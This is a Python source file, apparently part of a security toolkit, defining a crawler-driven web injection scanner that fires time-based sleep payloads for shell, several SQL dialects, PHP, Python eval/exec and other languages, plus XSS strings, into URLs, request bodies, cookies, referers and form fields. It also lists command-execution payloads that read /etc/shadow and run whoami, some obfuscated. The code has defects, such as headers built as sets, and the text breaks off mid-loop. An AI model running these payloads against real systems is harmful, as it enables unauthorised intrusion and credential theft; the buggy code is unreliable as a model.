import re
import time
import urllib.parse
from TheSilent.clear import clear
from TheSilent.kitten_crawler import kitten_crawler
from TheSilent.puppy_requests import text

RED = "\033[1;31m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"

def cobra(host,delay=0,crawl=1):
    hits = []

    mal_adobe_groovy = [r"sleep(60)"]

    mal_apple_script = [r"delay 60"]

    mal_command = [r"sleep 60",
                   r"sleep \6\0"]

    mal_command_enumerate = [r"cat /etc/shadow",
                             r"cat \/\e\t\c/\s\h\ad\o\w",
                             r"ls -l -a",
                             r"\l\s",
                             r"pwd",
                             r"\p\w\d",
                             r"whoami",
                             r"\w\h\o\a\m\i"]
    
    mal_go_lang = [r'package main;import "time";func main(){time.Sleep(60*time.Second)}']
    
    mal_ms_sql = [r'WAITFOR DELAY "00:01"']

    mal_my_sql = [r"SELECT SLEEP(60);"]

    mal_oracle_sql = [r"DBMS_LOCK.sleep(60);",
                  r"DBMS_SESSION.sleep(60);"]
    
    mal_perl = [r"sleep(60);"]

    mal_php = [r"sleep(60);"]

    mal_postgresql = [r"pg_sleep(60);",
                      r"PERFORM pg_sleep(60);",
                      r"SELECT pg_sleep(60);"]
    
    mal_powershell = [r"start-sleep -seconds 60"]

    mal_python = [r"time.sleep(60)",
                  r"eval(compile('import time\ntime.sleep(60)','cobra','exec'))",
                  r"eval(compile('import os\nos.system('sleep 60')','cobra','exec'))",
                  r"__import__('time').sleep(60)",
                  r"__import__('os').system('sleep 60')",
                  r'eval("__import__(\'time\').sleep(60)")',
                  r'eval("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("__import__(\'time\').sleep(60)")',
                  r'exec("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("import time\ntime.sleep(60)")',
                  r'exec("import os\nos.system(\'sleep 60\')")']

    mal_python_enumerate = [r"eval(compile('import os\nos.system('cat /etc/shadow')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('cat \/\e\t\c/\s\h\ad\o\w')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('ls -l -a')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\l\s')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('pwd')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\p\w\d')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('whoami')','cobra','exec'))",
                            r"eval(compile('import os\nos.system('\w\h\o\a\m\i')','cobra','exec'))",
                            r"__import__('os').system('cat /etc/shadow')",
                            r"__import__('os').system('cat \/\e\t\c/\s\h\ad\o\w')",
                            r"__import__('os').system('ls -l -a')",
                            r"__import__('os').system('\l\s')",
                            r"__import__('os').system('pwd')",
                            r"__import__('os').system('\p\w\d')",
                            r"__import__('os').system('whoami')",
                            r"__import__('os').system('\w\h\o\a\m\i')",
                            r'eval("__import__(\'os\').system(\'cat /etc/shadow\')")',
                            r'eval("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'eval("__import__(\'os\').system(\'ls -l -a\')")',
                            r'eval("__import__(\'os\').system(\'\l\s\')")',
                            r'eval("__import__(\'os\').system(\'pwd\')")',
                            r'eval("__import__(\'os\').system(\'\p\w\d\')")',
                            r'eval("__import__(\'os\').system(\'whoami\')")',
                            r'eval("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
                            r'exec("__import__(\'os\').system(\'cat /etc/shadow\')")',
                            r'exec("__import__(\'os\').system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'exec("__import__(\'os\').system(\'ls -l -a\')")',
                            r'exec("__import__(\'os\').system(\'\l\s\')")',
                            r'exec("__import__(\'os\').system(\'pwd\')")',
                            r'exec("__import__(\'os\').system(\'\p\w\d\')")',
                            r'exec("__import__(\'os\').system(\'whoami\')")',
                            r'exec("__import__(\'os\').system(\'\w\h\o\a\m\i\')")',
                            r'exec("import os\nos.system(\'cat /etc/shadow\')")',
                            r'exec("import os\nos.system(\'cat \/\e\t\c/\s\h\ad\o\w\')")',
                            r'exec("import os\nos.system(\'ls -l -a\')")',
                            r'exec("import os\nos.system(\'\l\s\')")',
                            r'exec("import os\nos.system(\'pwd\')")',
                            r'exec("import os\nos.system(\'\p\w\d\')")',
                            r'exec("import os\nos.system(\'whoami\')")',
                            r'exec("import os\nos.system(\'\w\h\o\a\m\i\')")']
    
    mal_ruby = [r"sleep(1.minutes)"]
    
    mal_xss = [r"<iframe>Cobra</iframe>",
               r"<p>cobra</p>",
               r"<script>alert('Cobra')</script>",
               r"<script>await sleep(60);</script>",
               r"<script>prompt('Cobra')</script>",
               r"<strong>cobra</strong>",
               r"<style>body{background-color:red;}</style>",
               r"<title>cobra</title>"]
    
    hosts = kitten_crawler(host,delay,crawl)

    for _ in hosts:
        print(CYAN + f"checking: {_}")

        try:
            forms = re.findall("<form.+form>",text(_).replace("\n",""))

        except:
            forms = []

        # check for adobe groovy injection
        for mal in mal_adobe_groovy:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"adobe groovy injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"adobe groovy injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"adobe groovy injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"adobe groovy injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"adobe groovy injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"adobe groovy injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for apple script injection
        for mal in mal_apple_script:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"apple script injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"apple script injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"apple script injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"apple script injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"apple script injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"apple script injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for command injection
        for mal in mal_command:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"command injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"command injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"command injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"command injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"command injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"command injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for go lang injection
        for mal in mal_go_lang:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"go lang injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"go lang injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"go lang injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"go lang injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"go lang injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"go lang injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for ms sql injection
        for mal in mal_ms_sql:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ms sql injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ms sql injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ms sql injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"ms sql injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"ms sql injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"ms sql injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for my sql injection
        for mal in mal_my_sql:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"my sql injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"my sql injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"my sql injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"my sql injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"my sql injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"my sql injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for oracle sql injection
        for mal in mal_oracle_sql:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"oracle sql injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"oracle sql injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"oracle sql injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"oracle sql injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"oracle sql injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"oracle sql injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for perl injection
        for mal in mal_perl:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"perl injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"perl injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"perl injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"perl injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"perl injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"perl injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for php injection
        for mal in mal_php:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"php injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"php injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"php injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"php injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"php injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"php injection in forms: {_} | {field_dict}")

                except:
                    pass

        # check for postgresql injection
        for mal in mal_postgresql:
            try:
                time.sleep(delay)
                start = time.time()
                data = text(_ + "/" + mal, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"postgresql injection in url: {_}/{mal}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, data = mal.encode(), timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"postgresql injection in data ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Cookie",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"postgresql injection in cookie ({mal}): {_}")

            except:
                pass

            try:
                time.sleep(delay)
                start = time.time()
                data = text(_, headers = {"Referer",mal}, timeout = 120)
                end = time.time()
                if end - start >= 45:
                    hits.append(f"postgresql injection in referer ({mal}): {_}")

            except:
                pass
            
            for form in forms:
                field_list = []
                input_field = re.findall("<input.+?>",form)
                try:
                    action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                    if action_field.startswith("/"):
                        action = host + action_field

                    elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                        action = host + "/" + action_field

                    else:
                        action = action_field
                        
                except IndexError:
                    pass

                try:
                    method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                    for in_field in input_field:
                        if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                            name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            try:
                                value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                            
                            except IndexError:
                                value_field = ""
                            
                            if type_field == "submit" or type_field == "hidden":
                                field_list.append({name_field:value_field})


                            if type_field != "submit" and type_field != "hidden":
                                field_list.append({name_field:mal})

                            field_dict = field_list[0]
                            for init_field_dict in field_list[1:]:
                                field_dict.update(init_field_dict)

                            time.sleep(delay)

                            if action:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
                                if end - start >= 45:
                                    hits.append(f"postgresql injection in forms: {action} | {field_dict}")

                            else:
                                start = time.time()
                                data = text(action,method=method_field,data=field_dict,timeout=120)
                                end = time.time()
